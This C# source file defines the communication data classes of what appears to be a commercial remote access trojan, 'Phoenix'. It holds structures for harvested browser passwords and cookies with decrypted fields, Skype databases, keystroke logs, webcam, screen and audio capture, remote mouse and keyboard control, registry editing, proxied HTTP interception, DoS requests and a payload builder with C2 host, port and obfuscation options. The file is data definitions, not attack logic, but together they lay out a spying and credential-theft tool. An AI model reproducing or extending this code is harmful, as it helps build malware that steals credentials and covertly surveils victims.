using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Microsoft.VisualBasic.Devices;
using System.Diagnostics;
using System.Runtime.Serialization;
using PhoenixLib.Datastore.KeystrokeClasses;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;
using Titanium.Web.Proxy.EventArguments;

namespace PhoenixLib.Datastore.CommunicationClasses
{
    //There are rules here
    //Every data measurement is assumed to be in bytes
    //Every clock speed measurement is assumed to be in Hz

    [Serializable()]
    public class IPRequest
    {
        [JsonProperty(PropertyName = "YourFuckingIPAddress")]
        public string IPAddress { get; set; }
        [JsonProperty(PropertyName = "YourFuckingLocation")]
        public string Location { get; set; }
        [JsonProperty(PropertyName = "YourFuckingHostname")]
        public string Hostname { get; set; }
        [JsonProperty(PropertyName = "YourFuckingISP")]
        public string ISP { get; set; }
    }

    [Serializable()]
    public enum ActionType
    {
        SendData,
        RequestData,
        NOP //gonna willingly make this mistake again
    }

    [Serializable()]
    public class Command
    {
        public ActionType action { get; set; }
        public String dataName { get; set; }
        public bool callback { get; set; }
        public byte[] data { get; set; }
    }

    [Serializable()]
    public class CPUInfo
    {
        [WMI("Name")]
        public String CPUName { get; set; }
        [WMI("NumberOfCores")]
        public uint CPUCoreCount { get; set; }
        [WMI("NumberOfLogicalProcessors")]
        public uint CPULogicalCount { get; set; }
        [WMI("MaxClockSpeed")]
        public uint CPUClockSpeed { get; set; }
        [WMI("Manufacturer")]
        public String CPUManufacturer { get; set; }
    }

    [Serializable()]
    public class GPUInfo
    {
        [WMI("Name")]
        public String GPUName { get; set; }
        [WMI("DriverVersion")]
        public String GPUDriverVersion { get; set; }
        [WMI("AdapterRAM")]
        public uint GPURAM { get; set; }
    }

    [Serializable()]
    public class RAMInfo
    {
        [WMI("Name")]
        public String RAMName { get; set; }
        [WMI("Manufacturer")]
        public String RAMManufacturer { get; set; }
        [WMI("Model")]
        public String RAMModel { get; set; }
        [WMI("Capacity")]
        public ulong RAMCapacity { get; set; }
        [WMI("Speed")]
        public uint RAMSpeed { get; set; }
        [WMI("PositionInRow")]
        public uint RAMPosition { get; set; }
    }
    [Serializable()]
    public class BIOSInfo
    {
        [WMI("Name")]
        public String BIOSName { get; set; }
        [WMI("Manufacturer")]
        public String BIOSManufacturer { get; set; }
        [WMI("Version")]
        public String BIOSVersion { get; set; }
    }
    [Serializable()]
    public class NetworkAdapterInfo
    {
        [WMI("Name")]
        public String NetworkAdapterName { get; set; }
        [WMI("Manufacturer")]
        public String NetworkAdapterManufacturer { get; set; }
        [WMI("MACAddress")]
        public String NetworkAdapterMACAddress { get; set; }
    }
    [Serializable()]
    public class DriveInfo
    {
        [WMI("Name")]
        public String DriveName { get; set; }
        [WMI("Manufacturer")]
        public String DriveManufacturer { get; set; }
        [WMI("Model")]
        public String DriveModel { get; set; }
        [WMI("Size")]
        public ulong DriveCapacity { get; set; }
    }
    [Serializable()]
    public class MonitorInfo
    {
        [WMI("Name")]
        public String MonitorName { get; set; }
        [WMI("MonitorManufacturer")]
        public String MonitorManufacturer { get; set; }
        [WMI("ScreenHeight")]
        public uint MonitorHeight { get; set; }
        [WMI("ScreenWidth")]
        public uint MonitorWidth { get; set; }
    }

    [Serializable()]
    public class SoundInfo
    {
        [WMI("Name")]
        public String SoundName { get; set; }
        [WMI("ProductName")]
        public String SoundProductName { get; set; }
        [WMI("Manufacturer")]
        public String SoundManufacturer { get; set; }
    }

    [Serializable()]
    public class SummaryInfo
    {
        public CPUInfo[] cpuInfo;
        public GPUInfo[] gpuInfo;
        public RAMInfo[] ramInfo;
        public BIOSInfo[] biosInfo;
        public NetworkAdapterInfo[] networkAdapterInfo;
        public DriveInfo[] driveInfo;
        public ScreenInfo[] monitorInfo;
        public SoundInfo[] soundInfo;
        public SoftwareInfo softwareInfo;
        public String internalIP;
        public bool batteryAvailible; //aka is it a laptop
    }

    [Serializable()]
    public class OperatingSystemInfo
    {
        [WMI("Name")]
        public String OperatingSystemName { get; set; }
        [WMI("SerialNumber")]
        public String SerialNumber { get; set; }
        [WMI("Version")]
        public String Version { get; set; }
        [WMI("LastBootUpTime")]
        public DateTime LastBootupTime { get; set; }
        [WMI("OSArchitecture")]
        public String Architecture { get; set; }
        [WMI("TotalVisibleMemorySize")]
        public ulong TotalMemorySize { get; set; }
        [WMI("SystemDrive")]
        public String SystemDrive { get; set; }
        [WMI("Primary")]
        public bool Primary { get; set; }
        [WMI("InstallDate")]
        public DateTime InstallDate { get; set; }
    }
    [Serializable()]
    public class UserAccountInfo
    {
        [WMI("Name")]
        public String Name { get; set; }
        [WMI("FullName")]
        public String FullName { get; set; }
        [WMI("LocalAccount")]
        public bool isLocalAccount { get; set; }
        [WMI("PasswordRequired")]
        public bool isPasswordProtected { get; set; }
    }

    [Serializable()]
    public class SoftwareInfo
    {
        public OperatingSystemInfo operationSystemInfo;
        public UserAccountInfo[] users;
    }

    [Serializable()]
    public class ProcessInfo
    {
        public String name { get; set; }
        public String activeWindow { get; set; }
        public int id { get; set; }
        private long memoryBacking { get; set; }
        public String memoryUsed
        {
            get
            {
                return (memoryBacking / 1024.00 / 1024.00) + " MB";
            }
            set
            {
                memoryBacking = long.Parse(value);
            }
        }
        public bool responding { get; set; }
    }

    [Serializable()]
    public class KeystrokeSession
    {
        public DateTime started { get; set; }
        public DateTime ended { get; set; }
        public String application { get; set; }
        public List<KeyPressed> keystrokes { get; set; }
        public TimeSpan elapsed
        {
            get
            {
                return ended - started;
            }
        }
    }

    [Serializable()]
    public class FileTransferInfo
    {
        public String stringData;
        public byte[] data;
    }

    [Serializable()]
    public class DirectoryRequest
    {
        public DirectoryInfo parent;
        public List<Object> children;
    }

    [Serializable()]
    public class LoginDataEntry
    {
        [SQLite("origin_url")]
        public String origin_url;
        [SQLite("action_url")]
        public String action_url;
        [SQLite("username_element")]
        public String username_element;
        [SQLite("username_value")]
        public String username_value;
        [SQLite("password_element")]
        public String password_element;
        [SQLite("password_value")]
        public byte[] password_value;
        [SQLite("times_used")]
        public int times_used;

        public bool decrypted;
        public String password_value_decrypted;
    }

    [Serializable()]
    public class ChromeCookieDataEntry
    {
        [SQLite("host_key")]
        public String host_key;
        [SQLite("name")]
        public String name;
        [SQLite("encrypted_value")]
        public byte[] encrypted_value;
        [SQLite("path")]
        public String path;
        [SQLite("secure")]
        public int secure;
        [SQLite("httponly")]
        public int http_only;

        public bool decrypted;
        public String encrypted_value_decrypted;
    }

    [Serializable()]
    public class CameraRequest
    {
        public int compressLevel;
    }

    [Serializable()]
    public class LicenseResponse
    {
        public bool success { get; set; }
        public string license { get; set; }
        public string item_name { get; set; }
        public string expires { get; set; }
        public string payment_id { get; set; }
        public string customer_name { get; set; }
        public string customer_email { get; set; }
        public string license_limit { get; set; }
        public int site_count { get; set; }
        public string activations_left { get; set; }
        public bool active
        {
            get
            {
                return (license.Equals("inactive") || license.Equals("active"));
            }
        }
    }

    [Serializable()]
    public class BuildResponse
    {
        public bool done { get; set; }
        public String message { get; set; }
        public bool containsBuildData { get; set; }
        public byte[] buildData { get; set; }
        public String buildString { get; set; }
    }

    [Serializable()]
    public class BuildRequest
    {
        public String outputExeName { get; set; }
        public bool customIcon { get; set; }
        public byte[] icon { get; set; }
        public bool internalization { get; set; }
        public bool antiTampering { get; set; }
        public int flowLevel { get; set; } //1 to 9
        public bool nativeExe { get; set; }
        public bool preJit { get; set; }
        public String hostname { get; set; }
        public int port { get; set; }
        public String identifier { get; set; }
        public String license { get; set; }
    }

    [Serializable()]
    public class WebcamWrapper
    {
        public String name { get; set; }
        public String niceName { get; set; }
    }

    [Serializable()]
    public class ScriptRequest
    {
        public int index;
        public String code;
    }

    [Serializable()]
    public class SpeechRequest
    {
        public String text;
        public String name;
        public int volume;
    }

    [Serializable()]
    public class FirefoxCookieDataEntry
    {
        [SQLite("host")]
        public String host_key;
        [SQLite("name")]
        public String name;
        [SQLite("value")]
        public String value;
        [SQLite("path")]
        public String path;
        [SQLite("isSecure")]
        public int secure;
        [SQLite("isHttpOnly")]
        public int http_only;
    }

    [Serializable()]
    public class FirefoxLoginData
    {
        public int nextId { get; set; }
        public List<FirefoxLoginEntry> logins { get; set; }
        public List<object> disabledHosts { get; set; }
        public int version { get; set; }
    }

    [Serializable()]
    public class FirefoxLoginEntry
    {
        public int id { get; set; }
        public string hostname { get; set; }
        public object httpRealm { get; set; }
        public string formSubmitURL { get; set; }
        public string usernameField { get; set; }
        public string passwordField { get; set; }
        public string encryptedUsername { get; set; }
        public string encryptedPassword { get; set; }
        public string guid { get; set; }
        public int encType { get; set; }
        public object timeCreated { get; set; }
        public object timeLastUsed { get; set; }
        public object timePasswordChanged { get; set; }
        public int timesUsed { get; set; }
    }

    [Serializable()]
    public class MessageBoxInfo
    {
        public String title;
        public String message;
        public MessageBoxButtons buttons;
        public MessageBoxIcon icon;
    }

    [Serializable()]
    public class DOSRequest
    {
        public int cooldown;
        public String host;
        public int threadCount;
    }

    [Serializable()]
    public class RegistryValue
    {
        public String name { get; set; }
        public Object value { get; set; }
    }
    [Serializable()]
    public class RegistryKeyData
    {
        public String backing
        {
            get
            {
                if (key.LastIndexOf("\\") != -1)
                {
                    return key.Substring(key.LastIndexOf("\\") + 1);
                }
                else
                {
                    return key;
                }
            }
            set
            {
                key = value;
            }
        }
        public String key { get; set; }
        public RegistryValue[] values { get; set; }
        public RegistryKeyData[] data { get; set; }
        public RegistryHive hive { get; set; }
        [NonSerialized()]
        public RegistryKey value;
        public override bool Equals(object obj)
        {
            if (obj is RegistryKeyData)
            {
                if (((RegistryKeyData)obj).key.Equals(key))
                {
                    return true;
                }
            }
            return false;
        }
        public override int GetHashCode()
        {
            return key.GetHashCode();
        }
    }

    [Serializable()]
    public class HttpHeader
    {
        public String name;
        public String value;
        public HttpHeader(Titanium.Web.Proxy.Models.HttpHeader header)
        {
            this.name = header.Name;
            this.value = header.Value;
        }
    }

    [Serializable()]
    public class HttpRequest
    {
        public List<HttpHeader> headers;
        public String requestUrl;
        public String requestMethod;
        public int requestLength;
        public bool isHttps;
        public String requestHostname;
        public String requestString;
        public Encoding requestEncoding;
        public HttpRequest(SessionEventArgs e)
        {
            this.headers = e.RequestHeaders.Select((x) => (new HttpHeader(x))).ToList();
            this.requestUrl = e.RequestUrl;
            this.requestMethod = e.RequestMethod;
            this.requestLength = e.RequestContentLength;
            this.requestHostname = e.RequestHostname;
            this.isHttps = e.IsHttps;
        }
    }

    [Serializable()]
    public class RegistryRequest
    {
        public RegistryHive? hive;
        public RegistryKeyData data;
        public RegistryValue newValue;
        public bool buildHive;
    }

    [Serializable()]
    public class RegistryResponse
    {
        public Dictionary<RegistryHive, RegistryKeyData> dictionary;
        public bool isDictionary;
        public RegistryKeyData keyData;
        public RegistryHive hive;
        public String error;
    }

    [Serializable()]
    public class ScreenRequest
    {
        public int indexOfMonitor;
        public int compressLevel;
    }

    [Serializable()]
    public class ScreenInfo
    {
        public String deviceName { get; set; }
        public int width { get; set; }
        public int height { get; set; }
    }

    [Serializable()]
    public class SkypeResponse
    {
        public List<SkypeAccountEntry> entries { get; set; }
    }
    [Serializable()]
    public class SkypeAccountEntry
    {
        public String skypeAccount { get; set; }
        public byte[] db { get; set; }
    }

    [Serializable()]
    public class KeypressRequest
    {
        public String key;
    }

    [Serializable()]
    public class MouseRequest
    {
        public double x { get; set; }
        public double y { get; set; }
        public double ax { get; set; }
        public double ay { get; set; }
        public bool isClick { get; set; }
        public bool isRightClick { get; set; }
        public int monitorIndex { get; set; }
    }

    [Serializable()]
    public class AudioRequest
    {
        public int rate;
        public int channels;
        public int bits;
        public byte[] data;
    }

    [Serializable()]
    [AttributeUsage(AttributeTargets.Property)]
    public class WMIAttribute : Attribute
    {
        public readonly string dataName;

        public WMIAttribute(String dataName)
        {
            this.dataName = dataName;
        }
    }

    [Serializable()]
    [AttributeUsage(AttributeTargets.Field)]
    public class SQLiteAttribute : Attribute
    {
        public readonly string dataName;

        public SQLiteAttribute(String dataName)
        {
            this.dataName = dataName;
        }
    }
}
